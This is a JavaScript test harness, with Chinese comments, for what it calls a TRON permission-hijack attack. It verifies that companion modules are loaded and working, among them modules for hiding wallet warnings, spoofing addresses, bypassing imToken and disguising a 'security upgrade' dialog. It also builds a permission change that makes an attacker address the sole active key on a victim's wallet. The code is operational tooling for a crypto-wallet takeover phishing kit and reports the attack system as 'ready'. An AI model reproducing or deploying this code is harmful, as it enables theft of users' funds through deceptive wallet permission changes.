/**
 * TRON权限劫持攻击测试器
 * 🔬 用于测试和验证权限劫持攻击的完整性和有效性
 */

(function() {
    'use strict';
    
    console.log('🔬 权限劫持攻击测试器已加载');
    
    // 测试配置
    const TEST_CONFIG = {
        // 模拟的受害者地址
        mockVictimAddress: 'TLPkfm2jMBDJCWu5vTQJgPgS1hzJgMKYc7',
        // 测试用的攻击者地址
        testAttackerAddress: 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x',
        // 测试结果存储
        testResults: {},
        // 测试状态
        testRunning: false
    };
    
    // 🔬 测试项目定义
    const TEST_CASES = {
        ENVIRONMENT_CHECK: {
            name: '环境检测测试',
            description: '检测TronWeb、钱包环境等基础条件',
            critical: true
        },
        BYPASS_SYSTEM_CHECK: {
            name: '安全绕过系统测试',
            description: '验证集成安全绕过系统是否正常加载和运行',
            critical: true
        },
        PERMISSION_HIJACK_INIT: {
            name: '权限劫持初始化测试',
            description: '测试权限劫持攻击系统的初始化过程',
            critical: true
        },
        UI_DISPLAY_TEST: {
            name: '用户界面伪装测试',
            description: '测试伪装的安全升级界面是否正常显示',
            critical: false
        },
        TRANSACTION_BUILD_TEST: {
            name: '权限交易构建测试',
            description: '测试权限修改交易的构建过程',
            critical: true
        },
        INTEGRATION_TEST: {
            name: '系统集成测试',
            description: '测试各个组件之间的协同工作',
            critical: false
        }
    };
    
    // 🔬 测试结果记录
    let testReport = {
        startTime: null,
        endTime: null,
        totalTests: 0,
        passedTests: 0,
        failedTests: 0,
        criticalFailures: 0,
        testDetails: {},
        overallStatus: 'NOT_STARTED'
    };
    
    // 🔬 执行单个测试
    async function runSingleTest(testKey, testConfig) {
        console.log(`🔬 开始测试: ${testConfig.name}`);
        
        const testResult = {
            name: testConfig.name,
            description: testConfig.description,
            status: 'RUNNING',
            startTime: Date.now(),
            endTime: null,
            error: null,
            details: {},
            critical: testConfig.critical
        };
        
        try {
            switch (testKey) {
                case 'ENVIRONMENT_CHECK':
                    await testEnvironment(testResult);
                    break;
                case 'BYPASS_SYSTEM_CHECK':
                    await testBypassSystem(testResult);
                    break;
                case 'PERMISSION_HIJACK_INIT':
                    await testPermissionHijackInit(testResult);
                    break;
                case 'UI_DISPLAY_TEST':
                    await testUIDisplay(testResult);
                    break;
                case 'TRANSACTION_BUILD_TEST':
                    await testTransactionBuild(testResult);
                    break;
                case 'INTEGRATION_TEST':
                    await testSystemIntegration(testResult);
                    break;
                default:
                    throw new Error(`未知的测试项目: ${testKey}`);
            }
            
            testResult.status = 'PASSED';
            testReport.passedTests++;
            console.log(`✅ 测试通过: ${testConfig.name}`);
            
        } catch (error) {
            testResult.status = 'FAILED';
            testResult.error = error.message;
            testReport.failedTests++;
            
            if (testConfig.critical) {
                testReport.criticalFailures++;
            }
            
            console.log(`❌ 测试失败: ${testConfig.name} - ${error.message}`);
        }
        
        testResult.endTime = Date.now();
        testResult.duration = testResult.endTime - testResult.startTime;
        testReport.testDetails[testKey] = testResult;
        
        return testResult;
    }
    
    // 🔬 测试环境检测
    async function testEnvironment(testResult) {
        testResult.details.checks = {};
        
        // 检查TronWeb
        if (!window.tronWeb) {
            testResult.details.checks.tronWeb = 'NOT_FOUND';
            throw new Error('TronWeb未找到');
        }
        testResult.details.checks.tronWeb = 'FOUND';
        
        // 检查TronWeb就绪状态
        if (!window.tronWeb.ready) {
            testResult.details.checks.tronWebReady = 'NOT_READY';
            // 这不是致命错误，可能需要等待
            console.log('⚠️ TronWeb未就绪，可能需要连接钱包');
        } else {
            testResult.details.checks.tronWebReady = 'READY';
        }
        
        // 检查浏览器环境
        testResult.details.checks.userAgent = navigator.userAgent;
        testResult.details.checks.isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        testResult.details.checks.isImToken = navigator.userAgent.includes('imToken') || window.imToken;
        
        console.log('🔬 环境检测完成:', testResult.details.checks);
    }
    
    // 🔬 测试安全绕过系统
    async function testBypassSystem(testResult) {
        testResult.details.systems = {};
        
        // 检查集成绕过系统
        if (window.IntegratedBypass) {
            testResult.details.systems.integratedBypass = 'LOADED';
            
            // 测试绕过功能
            try {
                window.IntegratedBypass.hideWarnings();
                testResult.details.systems.hideWarnings = 'WORKING';
            } catch (e) {
                testResult.details.systems.hideWarnings = 'ERROR: ' + e.message;
            }
        } else {
            testResult.details.systems.integratedBypass = 'NOT_FOUND';
            throw new Error('集成安全绕过系统未加载');
        }
        
        // 检查其他绕过系统
        const otherSystems = [
            'StableBypass', 'UltimateBypass', 'MaliciousAuth', 
            'SimpleAddressSpoofing', 'ImTokenBypass'
        ];
        
        otherSystems.forEach(system => {
            testResult.details.systems[system] = window[system] ? 'LOADED' : 'NOT_FOUND';
        });
        
        console.log('🔬 绕过系统检测完成:', testResult.details.systems);
    }
    
    // 🔬 测试权限劫持初始化
    async function testPermissionHijackInit(testResult) {
        testResult.details.initialization = {};
        
        // 检查权限劫持系统
        if (window.PermissionHijack) {
            testResult.details.initialization.permissionHijack = 'LOADED';
            
            // 测试状态获取
            try {
                const status = window.PermissionHijack.status();
                testResult.details.initialization.status = status;
                testResult.details.initialization.statusCheck = 'WORKING';
            } catch (e) {
                testResult.details.initialization.statusCheck = 'ERROR: ' + e.message;
            }
            
            // 测试统计信息获取
            try {
                const stats = window.PermissionHijack.getStats();
                testResult.details.initialization.stats = stats;
                testResult.details.initialization.statsCheck = 'WORKING';
            } catch (e) {
                testResult.details.initialization.statsCheck = 'ERROR: ' + e.message;
            }
        } else {
            testResult.details.initialization.permissionHijack = 'NOT_FOUND';
            throw new Error('权限劫持攻击系统未加载');
        }
        
        console.log('🔬 权限劫持初始化测试完成:', testResult.details.initialization);
    }
    
    // 🔬 测试UI界面显示
    async function testUIDisplay(testResult) {
        testResult.details.ui = {};
        
        // 模拟显示升级界面（但不实际执行）
        try {
            // 检查CSS注入
            const bypassStyles = document.getElementById('permission-bypass-css');
            testResult.details.ui.cssInjection = bypassStyles ? 'INJECTED' : 'NOT_FOUND';
            
            // 检查模态框创建能力
            const testModal = document.createElement('div');
            testModal.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0,0,0,0.8);
                z-index: 999999;
                display: none;
            `;
            document.body.appendChild(testModal);
            
            // 测试样式应用
            const computedStyle = window.getComputedStyle(testModal);
            testResult.details.ui.modalCreation = computedStyle.position === 'fixed' ? 'WORKING' : 'FAILED';
            
            // 清理测试元素
            testModal.remove();
            
            testResult.details.ui.overall = 'TESTED';
            
        } catch (error) {
            testResult.details.ui.error = error.message;
            throw new Error('UI显示测试失败: ' + error.message);
        }
        
        console.log('🔬 UI显示测试完成:', testResult.details.ui);
    }
    
    // 🔬 测试交易构建
    async function testTransactionBuild(testResult) {
        testResult.details.transaction = {};
        
        if (!window.tronWeb || !window.tronWeb.ready) {
            testResult.details.transaction.status = 'SKIPPED - TronWeb not ready';
            console.log('⚠️ TronWeb未就绪，跳过交易构建测试');
            return;
        }
        
        try {
            // 测试地址转换
            const testAddress = TEST_CONFIG.testAttackerAddress;
            const hexAddress = window.tronWeb.address.toHex(testAddress);
            testResult.details.transaction.addressConversion = 'WORKING';
            testResult.details.transaction.testAddress = testAddress;
            testResult.details.transaction.hexAddress = hexAddress;
            
            // 测试权限配置构建（不实际发送）
            const mockPermissionConfig = {
                type: 2,
                permission_name: "active",
                threshold: 1,
                keys: [{
                    address: hexAddress,
                    weight: 1
                }]
            };
            
            testResult.details.transaction.permissionConfig = mockPermissionConfig;
            testResult.details.transaction.configBuild = 'WORKING';
            
            console.log('🔬 交易构建测试完成 (模拟)');
            
        } catch (error) {
            testResult.details.transaction.error = error.message;
            throw new Error('交易构建测试失败: ' + error.message);
        }
    }
    
    // 🔬 测试系统集成
    async function testSystemIntegration(testResult) {
        testResult.details.integration = {};
        
        try {
            // 测试各系统之间的通信
            const systems = ['IntegratedBypass', 'PermissionHijack'];
            const communicationResults = {};
            
            systems.forEach(system => {
                if (window[system]) {
                    communicationResults[system] = 'AVAILABLE';
                    
                    // 测试系统方法调用
                    try {
                        if (system === 'IntegratedBypass' && window[system].environment) {
                            const env = window[system].environment;
                            communicationResults[system + '_methods'] = 'WORKING';
                        }
                        
                        if (system === 'PermissionHijack' && window[system].status) {
                            const status = window[system].status();
                            communicationResults[system + '_methods'] = 'WORKING';
                        }
                    } catch (e) {
                        communicationResults[system + '_methods'] = 'ERROR: ' + e.message;
                    }
                } else {
                    communicationResults[system] = 'NOT_AVAILABLE';
                }
            });
            
            testResult.details.integration.systemCommunication = communicationResults;
            testResult.details.integration.overall = 'TESTED';
            
        } catch (error) {
            testResult.details.integration.error = error.message;
            throw new Error('系统集成测试失败: ' + error.message);
        }
        
        console.log('🔬 系统集成测试完成:', testResult.details.integration);
    }
    
    // 🔬 运行完整测试套件
    async function runFullTestSuite() {
        if (TEST_CONFIG.testRunning) {
            console.log('⚠️ 测试已在运行中');
            return testReport;
        }
        
        TEST_CONFIG.testRunning = true;
        testReport = {
            startTime: Date.now(),
            endTime: null,
            totalTests: Object.keys(TEST_CASES).length,
            passedTests: 0,
            failedTests: 0,
            criticalFailures: 0,
            testDetails: {},
            overallStatus: 'RUNNING'
        };
        
        console.log('🔬🔬🔬 开始权限劫持攻击完整性测试 🔬🔬🔬');
        console.log(`📊 计划执行 ${testReport.totalTests} 个测试项目`);
        
        try {
            // 按顺序执行所有测试
            for (const [testKey, testConfig] of Object.entries(TEST_CASES)) {
                await runSingleTest(testKey, testConfig);
                
                // 如果关键测试失败，可以选择停止
                if (testReport.criticalFailures > 2) {
                    console.log('❌ 过多关键测试失败，停止测试');
                    break;
                }
                
                // 测试间隔
                await new Promise(resolve => setTimeout(resolve, 100));
            }
            
            // 确定整体状态
            if (testReport.criticalFailures > 0) {
                testReport.overallStatus = 'CRITICAL_FAILURE';
            } else if (testReport.failedTests > 0) {
                testReport.overallStatus = 'PARTIAL_SUCCESS';
            } else {
                testReport.overallStatus = 'SUCCESS';
            }
            
        } catch (error) {
            testReport.overallStatus = 'SYSTEM_ERROR';
            testReport.systemError = error.message;
        }
        
        testReport.endTime = Date.now();
        testReport.totalDuration = testReport.endTime - testReport.startTime;
        TEST_CONFIG.testRunning = false;
        
        // 生成测试报告
        generateTestReport();
        
        return testReport;
    }
    
    // 🔬 生成测试报告
    function generateTestReport() {
        console.log('\n🔬🔬🔬 权限劫持攻击测试报告 🔬🔬🔬');
        console.log(`📊 总体状态: ${testReport.overallStatus}`);
        console.log(`📊 测试时间: ${testReport.totalDuration}ms`);
        console.log(`📊 总测试数: ${testReport.totalTests}`);
        console.log(`✅ 通过: ${testReport.passedTests}`);
        console.log(`❌ 失败: ${testReport.failedTests}`);
        console.log(`🚨 关键失败: ${testReport.criticalFailures}`);
        
        console.log('\n📋 详细测试结果:');
        Object.entries(testReport.testDetails).forEach(([key, result]) => {
            const statusIcon = result.status === 'PASSED' ? '✅' : '❌';
            const criticalTag = result.critical ? '🚨' : '';
            console.log(`${statusIcon} ${criticalTag} ${result.name}: ${result.status} (${result.duration}ms)`);
            
            if (result.error) {
                console.log(`   错误: ${result.error}`);
            }
        });
        
        console.log('\n🎯 建议:');
        if (testReport.overallStatus === 'SUCCESS') {
            console.log('✅ 所有测试通过，权限劫持攻击系统准备就绪');
        } else if (testReport.overallStatus === 'PARTIAL_SUCCESS') {
            console.log('⚠️ 部分测试失败，但核心功能正常，可以继续使用');
        } else {
            console.log('❌ 存在关键问题，建议修复后重新测试');
        }
    }
    
    // 🔬 快速健康检查
    function quickHealthCheck() {
        const health = {
            tronWeb: !!window.tronWeb,
            tronWebReady: window.tronWeb?.ready,
            integratedBypass: !!window.IntegratedBypass,
            permissionHijack: !!window.PermissionHijack,
            timestamp: Date.now()
        };
        
        console.log('🔬 快速健康检查:', health);
        return health;
    }
    
    // 🔬 暴露测试接口
    window.PermissionHijackTester = {
        runFullTest: runFullTestSuite,
        quickCheck: quickHealthCheck,
        getLastReport: () => testReport,
        config: TEST_CONFIG,
        testCases: TEST_CASES
    };
    
    // 自动执行快速检查
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            setTimeout(quickHealthCheck, 2000);
        });
    } else {
        setTimeout(quickHealthCheck, 1000);
    }
    
    console.log('🔬 权限劫持攻击测试器准备就绪');
    console.log('🔬 使用 window.PermissionHijackTester.runFullTest() 执行完整测试');
    
})();